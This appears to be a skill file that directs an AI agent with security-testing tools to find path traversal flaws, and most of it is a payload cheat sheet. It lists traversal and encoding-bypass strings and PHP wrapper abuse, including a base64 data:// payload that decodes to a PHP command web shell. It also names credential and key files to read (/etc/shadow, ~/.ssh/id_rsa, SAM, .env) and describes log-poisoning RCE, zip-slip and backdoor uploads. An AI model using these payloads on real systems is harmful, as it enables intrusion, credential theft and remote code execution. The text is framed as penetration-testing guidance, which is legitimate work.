# Path Traversal Detection Skill

## Objective
Identify Path Traversal (Directory Traversal) vulnerabilities that allow reading or writing files outside the intended directory.

## Instructions

### 1. Identify File-Handling Parameters
Look for parameters that might handle file paths:
```
file, path, folder, dir, document, root, pg, style,
pdf, template, php_path, doc, page, name, cat, download,
include, inc, locate, show, site, type, view, content,
layout, mod, conf, url, img, image, filename, load
```

### 2. Basic Traversal Payloads

**Linux targets:**
```
../../../etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2fetc/passwd
..%252f..%252f..%252fetc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
/etc/passwd
```

**Windows targets:**
```
..\..\..\windows\win.ini
..%5c..%5c..%5cwindows/win.ini
..%255c..%255c..%255cwindows/win.ini
%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows/win.ini
c:\windows\win.ini
c:/windows/win.ini
```

### 3. Encoding Bypass Techniques

**URL encoding:**
```
%2e%2e%2f = ../
%2e%2e/ = ../
..%2f = ../
%2e%2e%5c = ..\
```

**Double URL encoding:**
```
%252e%252e%252f = ../
%252e%252e/ = ../
..%252f = ../
```

**Unicode/UTF-8 encoding:**
```
..%c0%af = ../
..%c1%9c = ..\
%c0%ae%c0%ae%c0%af = ../
```

**Mixed encoding:**
```
..%c0%af..%c0%af = ../../
.%2e/.%2e/ = ../../
```

### 4. Filter Bypass Techniques

**Doubled sequences:**
```
....//....//....//etc/passwd
....\/....\/....\/etc/passwd
..../..../..../etc/passwd
....\\....\\....\\windows/win.ini
```

**Null byte (older systems):**
```
../../../etc/passwd%00.jpg
../../../etc/passwd%00.png
../../../etc/passwd\0.jpg
```

**Path truncation:**
```
../../../etc/passwd.....................................
```

**Backslash on Linux:**
```
..\..\..\..\etc/passwd
```

**Absolute path:**
```
/etc/passwd
C:\windows\win.ini
file:///etc/passwd
```

### 5. Wrapper/Protocol Abuse

**PHP wrappers:**
```
php://filter/convert.base64-encode/resource=../../../etc/passwd
php://filter/read=string.rot13/resource=../../../etc/passwd
php://input
expect://whoami
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
```

**File protocol:**
```
file:///etc/passwd
file://localhost/etc/passwd
```

### 6. Common Target Files

**Linux:**
```
/etc/passwd
/etc/shadow
/etc/hosts
/etc/hostname
/etc/issue
/etc/group
/proc/self/environ
/proc/self/cmdline
/proc/version
/proc/self/fd/0
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/auth.log
~/.bash_history
~/.ssh/id_rsa
~/.ssh/authorized_keys
```

**Windows:**
```
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\config\SAM
C:\Windows\repair\SAM
C:\Windows\repair\system
C:\Users\<username>\Desktop\desktop.ini
C:\inetpub\logs\LogFiles
C:\inetpub\wwwroot\web.config
```

**Application-specific:**
```
WEB-INF/web.xml
application.properties
application.yml
.env
config.php
wp-config.php
settings.py
database.yml
```

### 7. LFI to RCE Techniques

**Log poisoning:**
1. Inject PHP code in logs (User-Agent, Referer)
2. Include log file: `../../../var/log/apache2/access.log`

**Session file inclusion:**
```
../../../tmp/sess_<SESSION_ID>
../../../var/lib/php/sessions/sess_<SESSION_ID>
```

**PHP session poisoning:**
1. Set malicious session data
2. Include: `../../../tmp/sess_<ID>`

**Proc self:**
```
/proc/self/environ (if controllable)
/proc/self/fd/<FD>
```

### 8. ZIP/Archive Path Traversal

**Zip slip:**
Upload a ZIP containing:
```
../../../var/www/html/shell.php
```

Test with:
```
zip malicious.zip ../../../var/www/html/shell.php
```

### 9. Write Operations

**If write access is possible:**
```
../../../var/www/html/backdoor.php
..\..\..\..\inetpub\wwwroot\shell.aspx
```

### 10. Blind Path Traversal

**Detect via timing:**
- Existing file: fast response
- Non-existing file: error/slow response
- Use `collaborator_generate` for OOB data exfiltration

**Detect via error differences:**
```
../../../etc/passwd → 200 OK
../../../nonexistent → 500 Error
```

### 11. Confirm and Document
If confirmed, create finding with:
- Vulnerable parameter
- Working traversal payload
- Files readable/writable
- Evidence (file content)
- Impact assessment

## MCP Tools to Use
- `params_extract`: Identify file parameters
- `http1_request` / `http2_request`: Send traversal payloads
- `url_encode`: Encode payloads
- `base64_decode`: Decode PHP filter output
- `repeater_tab_with_payload`: Manual testing
- `intruder_prepare`: Automate path fuzzing
- `issue_create`: Report confirmed finding

## References
- PayloadsAllTheThings/Directory Traversal
- PayloadsAllTheThings/File Inclusion
- OWASP Path Traversal
